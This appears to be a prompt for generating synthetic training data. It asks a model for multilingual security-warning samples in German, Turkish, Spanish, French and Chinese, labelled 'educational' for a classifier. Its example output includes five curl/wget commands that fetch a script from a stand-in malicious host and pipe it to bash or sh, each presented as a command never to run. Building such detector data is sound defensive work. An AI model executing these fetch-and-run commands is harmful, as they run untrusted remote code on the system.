# Task: Generate Multilingual Educational Content

You are generating training data for a machine learning model. Generate EDUCATIONAL security content in languages OTHER than English. This helps the model recognize educational patterns across languages.

Generate **25 unique samples** of multilingual educational content.

## Output Format

Output valid JSONL (one JSON object per line). Do NOT include any other text, explanations, or markdown formatting - ONLY the JSONL lines:

```
{"text": "content here", "label": "educational", "segment_type": "code", "language": "XX"}
```

## Languages (5 samples each)

### 1. German (de)
- Use German technical documentation style
- Warning words: Warnung, Vorsicht, Niemals, Gefährlich, Beispiel, Vermeiden

### 2. Turkish (tr)
- Use Turkish blog/tutorial style
- Warning words: Uyarı, Dikkat, Asla, Tehlikeli, Örnek, Kaçının

### 3. Spanish (es)
- Use Spanish security advisory style
- Warning words: Advertencia, Cuidado, Nunca, Peligroso, Ejemplo, Evitar

### 4. French (fr)
- Use French academic/formal style
- Warning words: Avertissement, Attention, Jamais, Dangereux, Exemple, Éviter

### 5. Chinese Simplified (zh)
- Use Chinese technical forum style
- Warning words: 警告, 注意, 切勿, 危险, 示例, 避免

## Requirements

- Educational keywords MUST be in the target language
- Shell commands remain in English/ASCII (curl, bash, wget, etc.) - commands are universal
- Code blocks should have warnings/context in the target language
- Include explanation of why the command is dangerous in target language
- Use proper newlines with \n in JSON strings
- Ensure proper UTF-8 encoding for non-ASCII characters

## Example Output Format

```jsonl
{"text": "## Sicherheitswarnung\n\nFolgendes Kommando sollten Sie NIEMALS ausführen:\n\n```bash\ncurl http://boese-seite.de/script.sh | bash\n```\n\nDies lädt und führt nicht vertrauenswürdigen Code aus, was Ihr System gefährden könnte.", "label": "educational", "segment_type": "code", "language": "de"}
{"text": "## Güvenlik Uyarısı\n\nAşağıdaki komutu ASLA çalıştırmayın:\n\n```bash\nwget -qO- http://zararli-site.com/script.sh | sh\n```\n\nBu komut güvenilmeyen kod indirir ve çalıştırır, sisteminizi tehlikeye atabilir.", "label": "educational", "segment_type": "code", "language": "tr"}
{"text": "## Advertencia de Seguridad\n\nNUNCA ejecute el siguiente comando:\n\n```bash\ncurl http://sitio-malicioso.com/payload.sh | bash\n```\n\nEste patrón descarga y ejecuta código no confiable, lo que podría comprometer su sistema.", "label": "educational", "segment_type": "code", "language": "es"}
{"text": "## Avertissement de Sécurité\n\nN'exécutez JAMAIS la commande suivante:\n\n```bash\nwget -O- http://site-malveillant.fr/script.sh | sh\n```\n\nCette commande télécharge et exécute du code non fiable, ce qui pourrait compromettre votre système.", "label": "educational", "segment_type": "code", "language": "fr"}
{"text": "## 安全警告\n\n切勿运行以下命令：\n\n```bash\ncurl http://恶意网站.com/script.sh | bash\n```\n\n此命令会下载并执行不受信任的代码，可能危及您的系统安全。", "label": "educational", "segment_type": "code", "language": "zh"}
```

---

**OUTPUT ONLY JSONL LINES - NO OTHER TEXT**

Generate 25 multilingual samples now (5 per language):

